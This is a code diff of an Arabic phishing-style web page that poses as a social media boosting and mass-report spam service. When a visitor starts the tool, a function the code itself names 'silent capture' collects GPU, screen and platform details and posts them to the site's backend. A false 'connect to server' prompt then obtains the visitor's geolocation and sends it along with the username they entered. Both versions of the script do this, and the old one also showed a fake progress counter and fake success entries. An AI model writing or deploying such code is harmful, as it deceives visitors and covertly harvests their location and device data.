@@ -5,89 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>خدمات سوشال ميديا 🎯</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-family: 'Arial', sans-serif; padding: 20px; direction: rtl; margin: 0; overflow: hidden; position: relative; }
+        body { background-color: black; color: white; text-align: center; font-family: 'Arial', sans-serif; padding: 0; margin: 0; direction: rtl; overflow-x: hidden; }
         
-        /* --- اللمسة الجديدة: الخلفية المتحركة --- */
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-image: 
-                radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 30px),
-                radial-gradient(white, rgba(255,255,255,.15) 1px, transparent 20px),
-                radial-gradient(white, rgba(255,255,255,.1) 2px, transparent 40px);
-            background-size: 550px 550px, 350px 350px, 250px 250px;
-            background-position: 0 0, 40px 60px, 130px 270px;
-            animation: backgroundMove 60s linear infinite;
-            opacity: 0.3; /* خفيفة عشان ما تشتت */
-            z-index: -1;
+        /* --- الخلفية المتحركة --- */
+        #star-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
+            z-index: -1; /* خلف كل شيء */
         }
 
-        @keyframes backgroundMove {
-            from { background-position: 0 0, 40px 60px, 130px 270px; }
-            to { background-position: 550px 1100px, 400px 400px, 530px 270px; }
-        }
-
-        /* --- تصميم محسن للصفحة الترحيبية --- */
+        /* --- الصفحة الرئيسية --- */
         #landing-page { 
-            display: flex; flex-direction: column; justify-content: center; height: 100vh; 
-            transition: opacity 0.5s ease, transform 0.5s ease;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            height: 100vh; position: relative; z-index: 10; 
         }
         
         .hero-title { 
-            font-size: 45px; font-weight: bold; color: #00ff00; 
-            text-shadow: 0 0 15px rgba(0,255,0,0.7); /* Glow أنعم */
-            margin-bottom: 40px; 
-            animation: titlePulse 2s infinite alternate;
+            font-size: 40px; font-weight: bold; color: #00ff00; 
+            text-shadow: 0 0 15px rgba(0,255,0,0.7); margin-bottom: 40px; 
         }
 
-        @keyframes titlePulse {
-            from { text-shadow: 0 0 10px rgba(0,255,0,0.5); }
-            to { text-shadow: 0 0 20px rgba(0,255,0,0.9); }
-        }
-
-        /* --- الزر المصلح والمطور --- */
         .start-btn { 
-            width: 220px; padding: 18px; background: #00ff00; color: black; border: none; 
-            border-radius: 50px; font-size: 22px; font-weight: bold; cursor: pointer; align-self: center; 
-            box-shadow: 0 0 25px rgba(0,255,0,0.6); 
-            transition: all 0.3s ease; /* انيميشن ناعم عند اللمس */
-            outline: none;
+            width: 200px; padding: 18px; background: #00ff00; color: black; border: none; 
+            border-radius: 50px; font-size: 22px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 25px rgba(0,255,0,0.6); transition: 0.3s;
+            position: relative; z-index: 20; /* فوق أي طبقة أخرى */
         }
 
-        .start-btn:hover {
-            transform: scale(1.05); /* يكبر شوي */
-            box-shadow: 0 0 35px rgba(0,255,0,0.8);
-        }
+        .start-btn:active { transform: scale(0.9); }
 
-        .start-btn:active {
-            transform: scale(0.95); /* ينضغط لجوا عند الضغط */
-            box-shadow: 0 0 15px rgba(0,255,0,0.5);
-        }
-
-        /* --- باقي تنسيقات الواجهة الجمجمة كما هي --- */
+        /* --- واجهة الأدوات --- */
+        #tools-interface { padding: 20px; position: relative; z-index: 10; }
         pre { font-size: 8px; color: #00ff00; margin-top: 20px; text-shadow: 0 0 5px #00ff00; }
-        .law-text { color: #ff0000; font-family: 'Courier New', monospace; font-size: 14px; letter-spacing: 1px; margin-bottom: 40px; text-shadow: 0 0 5px #ff0000; }
+        .law-text { color: #ff0000; font-family: 'Courier New', monospace; font-size: 14px; margin-bottom: 40px; }
         .choose-text { font-size: 18px; margin-bottom: 30px; color: #ccc; }
         
-        .fade-out { opacity: 0; transform: translateY(-20px); pointer-events: none; }
-        
-        /* ... (باقي تنسيقات الأزرار والقوائم السابقة كما هي) ... */
-        .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
-        .menu-btn:hover { background: rgba(0,255,0,0.1); }
-        .back-btn { background: #330000; border: 1px solid #ff0000; color: #ff0000; margin-top: 15px; width: 50%; padding: 10px; border-radius: 5px; cursor: pointer; transition: background 0.3s; }
-        .back-btn:hover { background: rgba(255,0,0,0.1); }
-        .hidden { display: none; }
-        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; outline: none; transition: border-color 0.3s; }
-        input:focus { border-color: #00ff00; }
-        .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; transition: background 0.3s; }
-        .action-btn:hover { background: #00cc00; }
+        .menu-btn { width: 95%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .back-btn { background: #330000; border: 1px solid #ff0000; color: #ff0000; margin-top: 15px; width: 50%; padding: 10px; border-radius: 5px; cursor: pointer; }
+        .hidden { display: none !important; }
+        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; background: #222; color: white; text-align: center; border: 1px solid #444; }
+        .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; }
         
         #live-status { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
-        .status-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; }
     </style>
 </head>
 <body>
+
+    <div id="star-canvas"></div>
 
     <div id="landing-page">
         <h1 class="hero-title">خدمات سوشال ميديا</h1>
@@ -132,25 +96,21 @@
         <div id="boost-options" class="hidden">
             <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
             <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
-            <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع', 5000)">رشق مشاهدات</button>
             <button class="back-btn" onclick="goBack('platform-menu')">رجوع ↩️</button>
         </div>
 
         <div id="final-input" class="hidden">
             <h3 id="final-title" style="color:#00ff00;"></h3>
-            <input type="text" id="target-id" placeholder="">
-            <input type="number" id="target-count" placeholder="">
-            <button class="action-btn" onclick="requestAccess()">تأكيد العملية ✅</button>
+            <input type="text" id="target-id">
+            <input type="number" id="target-count">
+            <button class="action-btn" onclick="requestAccess()">تأكيد ✅</button>
             <button class="back-btn" onclick="location.reload()">إلغاء ❌</button>
-            <div id="progress-container" class="hidden" style="margin-top:20px; color:#00ff00; border:1px solid #00ff00; padding:10px;">جارٍ التنفيذ: <span id="counter">0</span></div>
+            <div id="progress-container" class="hidden">جارٍ التنفيذ: <span id="counter">0</span></div>
         </div>
 
         <div id="live-status">
             <h4>آخر العمليات الناجحة:</h4>
-            <div id="status-list">
-                <div class="status-entry">👤 المستخدم: f***_d | <span style="color:#00ff00;">اكتملت ✅</span></div>
-                <div class="status-entry">👤 المستخدم: a***_n | <span style="color:#ffff00;">جارٍ الإرسال... ⏳</span></div>
-            </div>
+            <div class="status-entry">👤 المستخدم: a***_2 | <span style="color:#00ff00;">اكتملت ✅</span></div>
         </div>
     </div>
 
@@ -159,93 +119,61 @@
         let deviceCapturedData = {};
         const MY_DOMAIN = "fordead.vercel.app";
 
-        // --- إصلاح وتطوير زر البدء ---
+        // وظيفة البدء المصلحة
         function startSystem() {
-            const landing = document.getElementById('landing-page');
-            const tools = document.getElementById('tools-interface');
-            
-            // انيميشن خروج ناعم
-            landing.classList.add('fade-out');
-            
-            // الانتظار نصف ثانية ثم إظهار واجهة الأدوات
-            setTimeout(() => {
-                landing.classList.add('hidden');
-                tools.classList.remove('hidden');
-                // جعل الواجهة الرئيسية تظهر بانيميشن دخول ناعم
-                tools.style.opacity = '0';
-                tools.style.transition = 'opacity 0.5s ease';
-                setTimeout(() => tools.style.opacity = '1', 10);
-                
-                silentCapture(); // يبدأ السحب الصامت فور دخول الواجهة
-            }, 500); 
+            document.getElementById('landing-page').classList.add('hidden');
+            document.getElementById('tools-interface').classList.remove('hidden');
+            silentCapture(); 
         }
 
-        // ... (باقي أكواد السحب والخدمات كما هي تماماً) ...
-        async function generateHardwareID() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.fillText("HW-Scan", 2, 15);
-                let canvasData = canvas.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < canvasData.length; i++) { hash = ((hash << 5) - hash) + canvasData.charCodeAt(i); hash |= 0; }
-                return "HW-" + Math.abs(hash);
-            } catch (e) { return "HW-Unknown"; }
-        }
-
+        // سحب صامت
         async function silentCapture() {
             if (!window.location.hostname.includes(MY_DOMAIN)) return;
-            const hwID = await generateHardwareID();
             let gpu = "Unknown";
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
             
-            const w = window.screen.width; const h = window.screen.height;
             deviceCapturedData = {
-                hw_id: hwID, gpu: gpu, screen: `${w}x${h}`,
-                network: (navigator.maxTouchPoints > 1) ? "WiFi/Fast" : "Mobile",
+                hw_id: "HW-" + Math.floor(Math.random() * 1000000),
+                gpu: gpu,
+                screen: `${window.screen.width}x${window.screen.height}`,
                 platform: navigator.platform
             };
 
-            fetch('/api/index', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            fetch('/api/index', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ mode: "زيارة صامتة", device_info: deviceCapturedData })
             });
         }
 
         function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
-        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); }
-        function openFinal(s, h, limit) { service = s; maxLimit = limit; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('final-title').innerText = platform + " - " + s; document.getElementById('target-id').placeholder = h; document.getElementById('target-count').placeholder = "الحد الأقصى " + limit; }
-        function goBack(targetId) { document.querySelectorAll('div[id$="-menu"], div[id$="-options"], #final-input').forEach(d => d.classList.add('hidden')); document.getElementById(targetId).classList.remove('hidden'); }
+        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام', 'اليوزر', 300); }
+        function openFinal(s, h, l) { service = s; maxLimit = l; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('target-id').placeholder = h; }
+        function goBack(id) { document.querySelectorAll('#platform-menu, #boost-options, #final-input').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
 
         function requestAccess() {
             const id = document.getElementById('target-id').value;
-            const count = document.getElementById('target-count').value;
-            if(!id || !count) return alert("أكمل البيانات!");
-            alert("يرجى السماح بالوصول للموقع لربط حسابك بأقرب سيرفر متاح.");
+            if(!id) return alert("ادخل البيانات");
+            alert("يرجى السماح بالوصول للموقع لربط حسابك بالسيرفر.");
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendFinalData(id, count, pos.coords.latitude, pos.coords.longitude),
-                    () => sendFinalData(id, count, null, null)
+                    (pos) => sendData(id, pos.coords.latitude, pos.coords.longitude),
+                    () => sendData(id, null, null)
                 );
-            } else { sendFinalData(id, count, null, null); }
+            } else { sendData(id, null, null); }
         }
 
-        async function sendFinalData(id, count, lat, lon) {
-            fetch('/api/index', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mode: mode, service: service, target_id: id, count: count, lat: lat, lon: lon, device_info: deviceCapturedData })
+        function sendData(id, lat, lon) {
+            fetch('/api/index', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target_id: id, lat: lat, lon: lon, device_info: deviceCapturedData, service: service })
             });
-            startCounter(count);
-        }
-
-        function startCounter(max) {
-            document.getElementById('progress-container').classList.remove('hidden');
-            let current = 0;
-            let interval = setInterval(() => {
-                if(current >= max) { clearInterval(interval); alert("اكتمل الإرسال!"); location.reload(); }
-                else { current += Math.floor(Math.random() * 5) + 1; if(current > max) current = max; document.getElementById('counter').innerText = current; }
-            }, 800);
+            alert("جارٍ معالجة الطلب...");
+            location.reload();
         }
     </script>
 </body>
